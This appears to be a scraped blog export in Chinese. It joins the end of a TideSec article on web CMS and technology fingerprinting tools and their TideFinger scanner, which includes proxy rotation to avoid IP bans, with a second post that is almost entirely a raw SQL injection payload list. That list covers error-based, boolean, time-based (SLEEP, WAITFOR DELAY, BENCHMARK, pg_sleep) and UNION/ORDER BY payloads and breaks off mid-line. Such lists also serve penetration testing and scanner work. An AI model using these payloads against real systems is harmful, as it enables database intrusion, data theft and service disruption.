4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征 通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用&#x2F;solr目录，weblogic可能使用wls-wsat目录等。 5、开发语言的识别 web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有： 通过爬虫获取动态链接进行直接判断是比较简便的方法。 asp判别规则如下&lt;a[^&gt;]*?href=(&#39;|&quot;)[^http][^&gt;]*?\\.asp(\\?|\\#|\\1)，其他语言可替换相应asp即可。 通过X-Powered-By进行识别 比较常见的有X-Powered-By: ASP.NET或者X-Powered-By: PHP/7.1.8 通过Set-Cookie进行识别 这种方法比较常见也很快捷，比如Set-Cookie中包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx等。 指纹识别工具在研究指纹识别技术的时候，不可避免的分析了大量指纹识别工具，在此将自己用过的几个感觉不错的工具和平台介绍一下。 国外指纹识别工具WhatWeb（推荐指数★★★★★）下载地址：https://github.com/urbanadventurer/WhatWeb Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。 123Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。在debian/ubuntu系统下可直接`apt-get install whatweb`,kali已自带。 使用非常简单whatweb http://www.tidesec.net即可，也可以加参数-v显示更详细的信息。 Wapplyzer（推荐指数★★★★）下载地址：https://github.com/AliasIO/Wappalyzer Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。 Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：https://wappalyzer.com/applications Whatruns（推荐指数★★★★）Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。 跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。 安装完成后，通过插件图标来获取服务的详细运行信息，效果如下。有时候信息会比Wapplyzer还详细一些，但有时候获取速度稍慢。 Plecost（推荐指数★★★）下载地址：https://github.com/iniqua/plecost Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。 使用也比较方便 plecost -i /usr/share/plecost/wp_plugin_list.txt http://www.freebuf.com BlindElephant（推荐指数★★）下载地址：https://github.com/lokifer/BlindElephant BlindElephant是一款Web应用程序指纹识别工具。该工具可以读取目标网站的特定静态文件，计算其对应的哈希值，然后和预先计算出的哈希值做对比，从而判断目标网站的类型和版本号。目前，该工具支持15种常见的Web应用程序的几百个版本。同时，它还提供WordPress和Joomla的各种插件。该工具还允许用户自己扩展，添加更多的版本支持。 不过该软件最新更新是在2013年，插件库应该算比较旧的了。 下载及安装可参考https://github.com/lokifer/BlindElephant，kali中已经内置。 使用命令：BlindElephant.py http://www.freebuf.com wordpress 国内指纹识别工具御剑web指纹识别程序下载地址：https://www.webshell.cc/4697.html 御剑web指纹识别程序是一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。 windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。 Test404轻量WEB指纹识别下载地址：https://www.test404.com/post-1618.html Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。 w11scan分布式WEB指纹识别平台w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增&#x2F;修改指纹，建立批量的扫描任务，并且支持多种搜索语法。 安装和下载可参考：https://github.com/w-digital-scanner/w11scan 手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。 Dayu指纹识别工具下载地址：https://github.com/Ms0x0/Dayu “大禹”为一款c&#x2F;s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。 WebEye下载地址：https://github.com/zerokeeper/WebEye/ WebEye可快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架，使用异步实现指纹的快速识别。 识别速度比较快，不过指纹库不是很多，指纹库不是基于md5之类的，而是类似于fofa通过http头信息、关键字等进行快速识别。 作者对指纹进行了分类，如摄像头、waf、cdn、网络设备等，很多指纹都是精心搜集的。 WTF_Scan下载地址：https://github.com/dyboy2017/WTF_Scan WTF团队出品的指纹识别平台，包括的功能也相对比较多，除了指纹识别外，还有DNS解析、子域名、CDN、端口扫描、敏感目录等。 不过就单独说指纹规则来说，不算很多，可以自己添加完善，在WTF_Scan/wtf/app/api/cms/cms.txt文件中进行指纹修改。 Webfinger基于fofa的规则库进行快速检索，大约2000+条指纹数据，位于lib&#x2F;web.db可自行添加修改。 下载地址：https://github.com/se55i0n/Webfinger 类似的还有个CMSCANhttps://github.com/cuijianxiong/cmscan/ FingerPrint好像是百度的一个MM用perl写的一款工具，调用Wappalyzer模块进行指纹识别。 下载地址：https://github.com/tanjiti/FingerPrint 在线指纹识别云悉指纹识别http://www.yunsee.cn/ 指纹库很强大，速度也很快，我们前端还仿了下云悉的界面，免费服务，还能提供api接口！ 如果指纹能开源就好了，哈哈~~ bugscaner指纹识别http://whatweb.bugscaner.com/look/ 目前好像指纹比较少，很多都识别不出来了。 whatweb.nethttps://whatweb.net/ 之前功能还不错，现在好像只能查看到header信息了。 TideFinger上面介绍了那么多超级工具，都不好意思写自己做的小破烂东西了…大佬们可以关掉本页面了… 通过对各种识别对象、识别方法、识别工具的分析，发现大家的指纹库各式各样，识别方式也是各有千秋，传统的md5、url路径的方式居多，识别header信息的也是不少，但没有一个能集众家之长的小工具。 于是我们就做了一个小工具TideFinger 1https://github.com/TideSec/TideFinger 指纹库整理我们搜集了上面所有的指纹软件，从中提取了指纹库，进行了统一的格式化处理并进行去重，最终得到了一个大约2078条的传统指纹库。本来想把fofa的库也合并进来，发现格式差异有些大，便保持了fofa指纹库，并把WebEye的部分指纹和fofa指纹进行了合并。这样就保留了两个指纹库，其中cms指纹库为传统的md5、url库，大约2078条指纹，可通过关键字、md5、正则进行匹配，fofa库为2119指纹，主要对Header、url信息进行匹配。 指纹库优化在对指纹库整理去重后，对每个指纹进行了命中率的标识，当匹配到某个指纹时该指纹命中率会加1，而在使用指纹时会从优先使用命中率高的指纹。 然后我们从互联网中爬取了10W个域名进行了命中率测试，然后对一些误报率比较高的指纹进行了重新优化，得到了一份相对更高效的指纹库。 未知指纹发现目前新指纹的识别基本还是靠人工发现然后分析规则再进行添加，所以各平台都有提交指纹的功能，但是我们没有这种资源，只能另想办法。 于是想到了一个比较笨的方法：从网站中爬取一些静态文件，如png、ico、jpg、css、js等，提取url地址、文件名、计算md5写入数据库，这样再爬下一个网站，一旦发现有相同的md5，就把新的url也加入到那条记录中，并把hint值加1，这样爬取10W个站点后，就能得到一个比较客观的不同网站使用相同md5文件的数据了。 获取链接代码部分 1234567891011121314151617181920212223242526272829303132excludeext = [&#x27;.png&#x27;, &#x27;.ico&#x27;, &#x27;.gif&#x27;,&#x27;.svg&#x27;, &#x27;.jpeg&#x27;,&#x27;js&#x27;,&#x27;css&#x27;,&#x27;xml&#x27;,&#x27;txt&#x27;]def getPageLinks(url): try: headers = requests_headers() content = requests.get(url, timeout=5, headers=headers, verify=False).text.encode(&#x27;utf-8&#x27;) links = [] tags = [&#x27;a&#x27;, &#x27;A&#x27;, &#x27;link&#x27;, &#x27;script&#x27;, &#x27;area&#x27;, &#x27;iframe&#x27;, &#x27;form&#x27;] # img tos = [&#x27;href&#x27;, &#x27;src&#x27;, &#x27;action&#x27;] if url[-1:] == &#x27;/&#x27;: url = url[:-1] try: for tag in tags: for to in tos: link1 = re.findall(r&#x27;&lt;%s.*?%s=&quot;(.*?)&quot;&#x27; % (tag, to), str(content)) link2 = re.findall(r&#x27;&lt;%s.*?%s=\\&#x27;(.*?)\\&#x27;&#x27; % (tag, to), str(content)) for i in link1: links.append(i) for i in link2: if i not in links: links.append(i) except Exception, e: print e print &#x27;[!] Get link error&#x27; pass return links except: return [] 有兴趣的可以查看具体代码https://github.com/TideSec/TideFinger/blob/master/count_file_md5.py文件。 爬取的结果如下： 当然了，里面肯定很多都属于误报，比如上图中第一个其实是个500错误页面，所以出现的比较多，第二个是政府网站最下边那个常见的“纠错”的js，所以用的也比较多… 经过一些分析整理也发现了一些小众的CMS和建站系统的指纹，比如三一网络建站系统的newsxx.php，比如大汉JCM的jhelper_tool_style.css等等，后续会持续把这些新的指纹丰富到指纹库中去。 指纹识别脚本有了指纹库之后，识别脚本就相对比较简单了，已有的一些也都比较成熟了，直接使用了webfinger和whatcms的部分代码并进行了整合优化，于是就有了TideFinger。 1、功能逻辑都比较简单，先用fofa库去匹配，然后获取一定banner，如果banner中识别除了cms，则返回结果，如果未识别到cms，则会调用cms规则库进行匹配各规则。 2、脚本支持代理模式，当设置了-p参数，且proxys_ips.txt文件包含代理地址时，脚本会随机调用代理地址进行扫描，以避免被封ip，不过这样的话效率可能会低一些。毕竟搜集的免费代理质量还是差一些，速度会慢很多。有钱人可以找收费代理池，然后每个规则都用不同代理去请求，这样肯定不会被封！ 代理地址的搜集可以使用我修改的另一个代理池https://github.com/TideSec/Proxy_Pool，提供了自动化的代理ip抓取+评估+存储+展示+接口调用。 3、经测试，一般网站把所有指纹跑一遍大约需要30秒时间，个别的网站响应比较慢的可能耗时更长一些，可以通过设置网站超时时间进行控制。 安装python2依赖库 12345pip install lxmlpip install requestspip install bs4说明：sqlite3库在Python 2.5.x 以上版本默认自带了该模块，如提示sqlite3出错请自行排查。 执行脚本 12345678$ python TideFinger.py Usage: python TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5] -u: 待检测目标URL地址 -p: 指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80 -m: 指纹匹配的线程数，不指定时默认为50 -t: 网站响应超时时间，默认为5秒 指纹识别界面如下： 指纹识别平台在有了指纹库和识别脚本之后，我们想继续完善下这个功能，于是又加入了其他一些功能，有了这个在线指纹查询平台http://finger.tidesec.net。 开始想加的很多，但后来在速度和时间方面不得不进行了一定的取舍，于是就有了目前如下的功能。 1、网站信息：网站标题、状态码、302跳转信息等； 2、IP地址信息：IP归属地、IP服务商信息、GPS信息； 3、CDN识别：对目标是否使用CDN进行检测，但目前CDN识别指纹还不多，对部分识别出使用CDN的目标还会列出来CNAME； 4、中间件识别：主要通过http头信息中的XPB、server等字段获取中间件信息，如nginx、iis、tomcat等； 5、更多banner：主要是调用了whatweb和Wapplyzer进行更多banner信息的获取，如jquery、bootstrap等； 6、操作系统识别：识别比较简单，通过ttl值和文件大小写是否敏感…用nmap去识别的话速度太慢… 7、本来还加入了子域名发现、端口扫描和waf探测等等，但发现耗时相对较长，而且比较容易被封IP，所以又去掉了。 团队没有专门做前端的，看云悉界面比较美观，所以就参考了云悉和WTF_Scan的界面布局，大佬不要打我们…使用了TP5框架，因为平台的功能都比较low，以防被喷就不放源码了。 大家可以试用下，给我们提提意见http://finger.tidesec.net 注册需要验证码，关注下我们公众号回复“潮汐指纹”即可被逼拉流量O(∩_∩)O哈哈 待解决的问题1、指纹库的继续完善：这是个旷日持久的工作，希望能坚持下去，我们也会持续的开源最新指纹库，希望大家手头有好的资源也可以贡献出来。 2、代理问题：虽然集成了代理功能，但经实际使用来看，搜集的免费代理质量还是差一些，速度会慢很多。 3、IP会被封：有的网站防护对目录枚举或一些路径非常敏感，会封IP地址； 4、下一步尝试对http头进行语义分析，从海量网站中提取分析header的共性，更高效的发现未知指纹； 5、因为穷，所以目前还是单节点进行指纹的识别，如果是第三步进入常规目录检测的方式的话可能速度会比较慢。 参考资料在指纹库搜集和脚本开发过程中，查阅了大量资料，下面列举的可能不全，在此一并感谢这些无私奉献的安全研究者。 https://www.freebuf.com/articles/2555.html https://blog.51cto.com/simeon/2115190 https://www.freebuf.com/news/137497.html https://www.freebuf.com/articles/web/129939.html https://www.freebuf.com/sectool/135216.html https://www.test404.com/post-1299.html?wafcloud=1 https://github.com/se55i0n/Webfinger https://github.com/tanjiti/FingerPrint https://github.com/dyboy2017/WTF_Scan https://github.com/zerokeeper/WebEye/ https://github.com/Ms0x0/Dayu https://github.com/w-digital-scanner/w11scan https://www.webshell.cc/4697.html https://github.com/lokifer/BlindElephant https://github.com/iniqua/plecost https://github.com/AliasIO/Wappalyzer https://github.com/urbanadventurer/WhatWeb 小福利1、指纹检测工具下载 我们把上面的13款指纹识别工具和搜集到的一些论文资料进行了汇总打包，大家可以直接下载。 下载地址：https://pan.baidu.com/s/190K34cwjAWDUMLtR8EWvNA 提取码：5y4o 解压密码www.tidesec.net 后续如有更新，会在我们公众号TideSec安全团队上提供下载，回复“指纹工具”即可获取最新指纹识别工具下载地址。 2、指纹库下载 我们在GitHub上提供的是2019年4月的指纹库（还未进行大量的命中率测试），后续我们还会优化调整命中策略、未知指纹识别方法，持续更新优化指纹库。 最新指纹库的下载请关注我们公众号TideSec安全团队，回复“指纹库”即可获取最新指纹库下载地址。 关注我们TideSec安全团队： Tide安全团队正式成立于2019年1月，是以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT&#x2F;物联网&#x2F;工控安全等方向。 想了解更多Tide安全团队，请关注团队官网: http://www.TideSec.net 或关注公众号： 和我联系：","categories":[],"tags":[]},{"title":"","slug":"sql注入","date":"2024-02-26T01:22:49.774Z","updated":"2022-05-25T02:57:21.504Z","comments":true,"path":"2024/02/26/sql注入/","permalink":"http://example.com/2024/02/26/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&#x27;&#x27;&#x27;```,&quot;&quot;&quot;///\\\\\\;&#x27; or &quot;-- or # &#x27; OR &#x27;1&#x27; OR 1 -- -&quot; OR &quot;&quot; = &quot;&quot; OR 1 = 1 -- -&#x27; OR &#x27;&#x27; = &#x27;&#x27;=&#x27;&#x27;LIKE&#x27;&#x27;=0--+ OR 1=1&#x27; OR &#x27;x&#x27;=&#x27;x&#x27; AND id IS NULL; --&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;UNION SELECT &#x27;2%00/*…*/ + addition, concatenate (or space in url)|| (double pipe) concatenate% wildcard attribute indicator@variable local variable@@variable global variable# NumericAND 1AND 0AND trueAND false1-false1-true1*56-21&#x27; ORDER BY 1--+1&#x27; ORDER BY 2--+1&#x27; ORDER BY 3--+1&#x27; ORDER BY 1,2--+1&#x27; ORDER BY 1,2,3--+1&#x27; GROUP BY 1,2,--+1&#x27; GROUP BY 1,2,3--+&#x27; GROUP BY columnnames having 1=1 ---1&#x27; UNION SELECT 1,2,3--+&#x27; UNION SELECT sum(columnname ) from tablename ---1 UNION SELECT 1 INTO @,@-1 UNION SELECT 1 INTO @,@,@1 AND (SELECT * FROM Users) = 1 &#x27; AND MID(VERSION(),1,1) = &#x27;5&#x27;;&#x27; and 1 in (select min(name) from sysobjects where xtype = &#x27;U&#x27; and name &gt; &#x27;.&#x27;) --Finding the table nameTime-Based:,(select * from (select(sleep(10)))a)%2c(select%20*%20from%20(select(sleep(10)))a)&#x27;;WAITFOR DELAY &#x27;0:0:30&#x27;--Comments:# Hash comment/* C-style comment-- - SQL comment;%00 Nullbyte` Backtick 基于通用错误的有效负载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154 OR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND (&#x27;pytW&#x27; LIKE &#x27;pytW OR 3409=3409 AND (&#x27;pytW&#x27; LIKE &#x27;pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND &#x27;%&#x27;=&#x27; AND 1=0 AND &#x27;%&#x27;=&#x27; AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND (&#x27;1427=1427 AND 7506=9091 AND (&#x27;5913=5913 AND 7300=7300 AND &#x27;pKlZ&#x27;=&#x27;pKlZ AND 7300=7300 AND &#x27;pKlZ&#x27;=&#x27;pKlY AND 7300=7300 AND (&#x27;pKlZ&#x27;=&#x27;pKlZ AND 7300=7300 AND (&#x27;pKlZ&#x27;=&#x27;pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#x27;Txws&#x27;=&#x27; RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#x27;Txws&#x27;=&#x27;IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--%&#x27; AND 8310=8310 AND &#x27;%&#x27;=&#x27;%&#x27; AND 8310=8311 AND &#x27;%&#x27;=&#x27; and (select substring(@@version,1,1))=&#x27;X&#x27; and (select substring(@@version,1,1))=&#x27;M&#x27; and (select substring(@@version,2,1))=&#x27;i&#x27; and (select substring(@@version,2,1))=&#x27;y&#x27; and (select substring(@@version,3,1))=&#x27;c&#x27; and (select substring(@@version,3,1))=&#x27;S&#x27; and (select substring(@@version,3,1))=&#x27;X&#x27; 基于时间的通用 SQL 注入负载1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# from wapitisleep(5)#1 or sleep(5)#&quot; or sleep(5)#&#x27; or sleep(5)#&quot; or sleep(5)=&quot;&#x27; or sleep(5)=&#x27;1) or sleep(5)#&quot;) or sleep(5)=&quot;&#x27;) or sleep(5)=&#x27;1)) or sleep(5)#&quot;)) or sleep(5)=&quot;&#x27;)) or sleep(5)=&#x27;;waitfor delay &#x27;0:0:5&#x27;--);waitfor delay &#x27;0:0:5&#x27;--&#x27;;waitfor delay &#x27;0:0:5&#x27;--&quot;;waitfor delay &#x27;0:0:5&#x27;--&#x27;);waitfor delay &#x27;0:0:5&#x27;--&quot;);waitfor delay &#x27;0:0:5&#x27;--));waitfor delay &#x27;0:0:5&#x27;--&#x27;));waitfor delay &#x27;0:0:5&#x27;--&quot;));waitfor delay &#x27;0:0:5&#x27;--benchmark(10000000,MD5(1))#1 or benchmark(10000000,MD5(1))#&quot; or benchmark(10000000,MD5(1))#&#x27; or benchmark(10000000,MD5(1))#1) or benchmark(10000000,MD5(1))#&quot;) or benchmark(10000000,MD5(1))#&#x27;) or benchmark(10000000,MD5(1))#1)) or benchmark(10000000,MD5(1))#&quot;)) or benchmark(10000000,MD5(1))#&#x27;)) or benchmark(10000000,MD5(1))#pg_sleep(5)--1 or pg_sleep(5)--&quot; or pg_sleep(5)--&#x27; or pg_sleep(5)--1) or pg_sleep(5)--&quot;) or pg_sleep(5)--&#x27;) or pg_sleep(5)--1)) or pg_sleep(5)--&quot;)) or pg_sleep(5)--&#x27;)) or pg_sleep(5)--AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#x27;vRxe&#x27;=&#x27;vRxeAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#x27;%&#x27;=&#x27;AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#SLEEP(5)#SLEEP(5)--SLEEP(5)=&quot;SLEEP(5)=&#x27;or SLEEP(5)or SLEEP(5)#or SLEEP(5)--or SLEEP(5)=&quot;or SLEEP(5)=&#x27;waitfor delay &#x27;00:00:05&#x27;waitfor delay &#x27;00:00:05&#x27;--waitfor delay &#x27;00:00:05&#x27;#benchmark(50000000,MD5(1))benchmark(50000000,MD5(1))--benchmark(50000000,MD5(1))#or benchmark(50000000,MD5(1))or benchmark(50000000,MD5(1))--or benchmark(50000000,MD5(1))#pg_SLEEP(5)pg_SLEEP(5)--pg_SLEEP(5)#or pg_SLEEP(5)or pg_SLEEP(5)--or pg_SLEEP(5)#&#x27;\\&quot;AnD SLEEP(5)AnD SLEEP(5)--AnD SLEEP(5)#&amp;&amp;SLEEP(5)&amp;&amp;SLEEP(5)--&amp;&amp;SLEEP(5)#&#x27; AnD SLEEP(5) ANd &#x27;1&#x27;&amp;&amp;SLEEP(5)&amp;&amp;&#x27;1ORDER BY SLEEP(5)ORDER BY SLEEP(5)--ORDER BY SLEEP(5)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--+benchmark(3200,SHA1(1))+&#x27;+ SLEEP(10) + &#x27;RANDOMBLOB(500000000/2)AND 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(500000000/2))))OR 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(500000000/2))))RANDOMBLOB(1000000000/2)AND 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))OR 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))SLEEP(1)/*&#x27; or SLEEP(1) or &#x27;&quot; or SLEEP(1) or &quot;*/ 通用联合选择有效载荷123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419ORDER BY SLEEP(5)ORDER BY 1,SLEEP(5)ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;))ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29ORDER BY 